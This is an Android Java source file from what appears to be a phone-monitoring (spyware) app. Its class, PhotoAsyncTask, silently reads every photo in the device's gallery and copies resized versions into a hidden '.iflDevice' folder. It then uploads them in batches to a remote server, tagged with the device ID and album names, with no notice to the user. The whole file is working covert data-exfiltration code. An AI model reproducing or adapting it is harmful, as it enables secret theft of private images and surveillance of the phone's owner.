/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.
 */
package com.hinj.asynctask;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.sql.Timestamp;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;

import org.json.JSONObject;

import android.content.Context;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.MediaStore;
import android.provider.Settings.Secure;
import android.util.Log;

import com.hinj.app.utils.ConnectUrl;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.JsonPostRequest;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;
import com.hinj.secure.smsgps.DeviceInterface;

public class PhotoAsyncTask extends AsyncTask<String, Void, String> {
	
	private Context ctx;
	private static final String TAG = "PhotoAsyncTask";
	private RequestPost mRequestPostClass;
	private DeviceInterface onComplete;
	Bitmap resized;
	
	/**
	 * 
	 */
	public PhotoAsyncTask(Context ctx,DeviceInterface onComplete) {
		this.ctx=ctx;
		this.onComplete=onComplete;
	}
	
	@Override
	public void onPreExecute() {
	}

	@Override
	protected String doInBackground(String... params) {
		
		try{
			getImagesDetail();
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			onComplete.onCompletedDeviceImages();
		}
		return null;
	}

	@Override
	public void onPostExecute(String serverResponse) {

	}
	
	/********************************** Images Upload On Server Start*****************************/ 
	public void getImagesDetail() {
		String filepath,imagename,imagetype;
		try{			
		final String orderBy = MediaStore.Images.Media._ID;
		Cursor imagecursor1 = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null,null, orderBy);
		
		int getTotal=imagecursor1.getCount();

		int PreImageCount=SpyCallSharedPrefrence.getsaveIMAGES_PreCount(ctx);
		int remaingCount=getTotal-PreImageCount;
		Log.i("remaining count", "remaining "+remaingCount);

		int pp;
		if(remaingCount>0)
		{
			Log.i("remaining count", remaingCount+"");
			if(remaingCount>2){
				 pp=2;
			}
			else{
				pp=remaingCount;
			}
		    
			Cursor imagecursor = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null,null,orderBy+" LIMIT "+PreImageCount+","+ pp);
			//CallActivity.Imagescount=CallActivity.Imagescount+pp;
			int image_column_index = imagecursor.getColumnIndex(MediaStore.Images.Media._ID);	
			Log.i("getTotalt***************", ""+getTotal);
			
			int j = 0;
			int countImage=0;
			while(imagecursor.moveToNext()){
				countImage++;
				//Toast.makeText(this, "i    "+imagecursor.getPosition(), Toast.LENGTH_SHORT).show();
				int id = imagecursor.getInt(image_column_index);
				int dataColumnIndex = imagecursor.getColumnIndex(MediaStore.Images.Media.DATA);
				int dateIndex = imagecursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN);
				
				String bucket;
				int bucketColumn = imagecursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);

				// Get the field values
				bucket = imagecursor.getString(bucketColumn);

				 // Do something with the values.
				Log.i("ListingImages", " bucket=" + bucket);
			
				String ImageDate= imagecursor.getString(dateIndex);
				if(ImageDate.equals("null")){
					Long.valueOf("1523415");	
				}
				long xyz=Long.valueOf(ImageDate);
				Timestamp st = new Timestamp(xyz);
				java.util.Date date1 = new java.util.Date(st.getTime());				
				DateFormat df = DateFormat.getDateInstance();				
				TimeZone zone1 = TimeZone.getTimeZone(df.getTimeZone().getID()); // For example...
				DateFormat format1 = new SimpleDateFormat("yyyy-MM-dd HH-mm-ss"); // Put your pattern here
				format1.setTimeZone(zone1);
				String SMStime = format1.format(date1);
				
				/*Calendar c = Calendar.getInstance();
				SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				String SMStime = df.format(c.getTime());	*/
                
				filepath = imagecursor.getString(dataColumnIndex);	
				Log.i("filepath************************", filepath);
				Bitmap bm;
				String newFilePath="";
				/************************************/
				try
				{
					bm=readBitmap(Uri.fromFile(new File(filepath)),ctx);
					resized = Bitmap.createScaledBitmap(bm,(int)(1000), (int)(1000), true);//new
				
                }
                catch (Exception e) {
                	e.printStackTrace();
                	break;                
				}
               
                //newFilePath = saveImage(bm,id);
                newFilePath = saveImage(resized,id);
				
				/************************************/
                try {
               
				j = filepath.lastIndexOf("/");
				imagename = filepath.substring(j + 1, filepath.lastIndexOf("."));
				imagetype = filepath.substring(filepath.lastIndexOf(".") + 1);
				
					if(Utility.isNetworkAvailable(ctx)) 
					{
						bm.recycle();
						System.gc();
						//new YourAsyncTask_ImagesDetail().execute(newFilePath,imagename,imagetype,SMStime,""+countImage,(PreImageCount+pp)+"");
						int imagePreCount=PreImageCount + pp;
						new YourAsyncTask_ImagesDetail().execute(newFilePath, imagename, imagetype, SMStime,"" + countImage, imagePreCount+ "",pp+"",bucket);
					}

				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
		catch (Exception e) {
			e.printStackTrace();
		}
	}

	class YourAsyncTask_ImagesDetail extends AsyncTask<String, Void, Void> {

		int getcountImage=0;
		int getRemainingCount;
		String getResponceImages;

		@Override
		protected void onPreExecute() {
		}

		@Override
		protected Void doInBackground(String... params) {
			// make your request here - it will run in a different thread
			try {
				getcountImage=Integer.parseInt(params[4]);
				getRemainingCount=Integer.parseInt(params[6]);
				getResponceImages = uploadImage2(params[0], params[1], params[2], params[3], params[7]);

				JSONObject responseObject = new JSONObject(getResponceImages);
				//JSONArray responseArray = responseObject.getJSONArray("upload");
				JSONObject JsonResponse =responseObject.getJSONObject("response");
				if(JsonResponse.getString("image").toString().contains("Image Success"))
				{
					SpyCallSharedPrefrence.saveIMAGES_PreCount(ctx,Integer.parseInt(params[5]));
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			return null;
		}

		@Override
		protected void onPostExecute(Void result) {			
			if(getcountImage==getRemainingCount) {
				try {
					//deleteFolder();
					// getVideoDetail();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	public String uploadImage2(String imagename, String imagename2,
			String imagetype,String imageDate, String albumname) {

		String upload_device_id = HinjAppPreferenceUtils.getUploadDeviceID(ctx);
		String android_id = Secure.getString(ctx.getContentResolver(),Secure.ANDROID_ID);
		
		Log.i("resonse", "anotherone");
		File file = new File(imagename);
		ArrayList<String> arraylist2 = new ArrayList<String>();
		arraylist2.add(file.getPath());
		ArrayList<String[]> arraylist1 = new ArrayList<String[]>();		
		String b[] = { "date_time",imageDate};
		arraylist1.add(b);
		String c[] = { "device_os", "Android" };
		arraylist1.add(c);
		/*String d[] = { "user_id",getUserID_SP };
		arraylist1.add(d); */
		String e[] = { "type", "" };
		arraylist1.add(e); 
		String f[] = { "upload_device_id", android_id };
		arraylist1.add(f); 
		String g[] = { "album", albumname };
		arraylist1.add(g); 
		JsonPostRequest postrequest = new JsonPostRequest();
		//http://evt17.com/iphone/android_services/whatsapp_upload
		String imageResponse = postrequest.doPostWithFile1(ConnectUrl.URL_Images_upload, arraylist1,arraylist2, imagename2, imagetype);
		//String imageResponse = postrequest.doPostWithFile1(ConnectUrl.URL_Hidden_Camera_upload, arraylist1,arraylist2, imagename2, imagetype);
		
		arraylist2.clear();
		arraylist1.clear();         
		return imageResponse;
	}
	
	//deleting the existing folder for image creation
	public static void deleteFolder()
	{
        try{
        Log.i("Remove File", "file Delete from folder iflDevice");	
		String fileSavePath="/mnt/sdcard/.iflDevice";
		File Imagedirectory=new File(fileSavePath);

		if(Imagedirectory.exists())
		{
			final File[] files = Imagedirectory.listFiles();
			for (File f: files)
			{
				f.delete();
			}
			Imagedirectory.delete();
		}}catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}

	}
	
	/*
	 * saving image from bitmap in portrait mode to upload at server
	 */
	public static String saveImage(Bitmap bm,int id)
	{
		//	file.createNewFile();
	
		File file=null;
		File folder=new File("/mnt/sdcard/.iflDevice");
		if(!folder.exists())
		{
			folder.mkdirs();
		}
		try {
			file = new File(folder,"image"+id+".jpeg");
			//Log.e("Image Name",file.getName()+"  getTotalSpace  "+bm.getByteCount());
			FileOutputStream fileOutputStream = new FileOutputStream(file);
			BufferedOutputStream bos = new BufferedOutputStream(fileOutputStream);		
			bm.compress(CompressFormat.JPEG,80,bos);
			
			bos.flush();
			bos.close();

			bm.recycle();
			System.gc();
			
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return file.getAbsolutePath();
	}
	
	/********************************** Images Upload On Server End*****************************/

	public static Bitmap readBitmap(Uri selectedImage,Context ctx) {
		Bitmap bm = null;
		BitmapFactory.Options options = new BitmapFactory.Options();
		options.inSampleSize = 5;
		AssetFileDescriptor fileDescriptor =null;
		try {
			fileDescriptor = ctx.getContentResolver().openAssetFileDescriptor(selectedImage,"r");
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		
		}
		finally{
			try {
				bm = BitmapFactory.decodeFileDescriptor(fileDescriptor.getFileDescriptor(), null, options);
				fileDescriptor.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return bm;
	} 
	
	 private String usingDateFormatter(long input){
			Calendar cal1 = Calendar.getInstance();
			TimeZone tz1 = cal1.getTimeZone();
			/* debug: is it local time? */
			Log.d("Time zone: ", tz1.getDisplayName());
			/* date formatter in local timezone */
			SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			sdf1.setTimeZone(tz1);
			/* print your timestamp and double check it's the date you expect */
			long timestamp1 = Long.valueOf(input);
			String getDatetime = sdf1.format(new Date(timestamp1 * 1000)); // I assume your timestamp is in seconds and you're converting to milliseconds?
		    
	        return getDatetime;
	 
	    }
}
